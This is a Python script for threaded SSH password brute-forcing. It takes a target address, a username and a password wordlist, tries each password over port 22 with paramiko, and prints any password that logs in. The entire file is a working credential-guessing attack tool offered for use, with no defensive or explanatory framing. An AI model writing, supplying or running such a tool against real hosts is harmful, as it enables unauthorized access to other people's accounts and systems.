import paramiko, sys, os, socket, termcolor
import threading, time


stop_flag = 0

def ssh_connect(password):
    global stop_flag

    # These are the two standard line and have to be executed before we try to connect
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored((f'[+] Password Found: {password} => For Account: {username}'), 'green'))
    except socket.error as e:
        print("[!!] Can't Connect")
    except:
        print(termcolor.colored((f'[-] Incorrect Login: {password}'), 'yellow'))

    ssh.close()


# IP address of the target from which user want to connect
host = input("[+] Target Address: ")

# Username of the SSH account user want to brute force
username = input("[+] SSH Username: ")

# File name of the password list, this will be used to guess the password.
input_file = input("[+] Passwords File: ")
print('\n')

# Check whether the password file exist or not
if os.path.exists(input_file) == False:
    print(termcolor.colored(("[!!] That file/path doesn't exist"), 'red'))
    sys.exit(1)

print(termcolor.colored((f'* * * Starting Threaded SSH Brute Force on {host} With Account: {username} * * *'), 'cyan'))
print("\n")
# Compare the passwords
with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)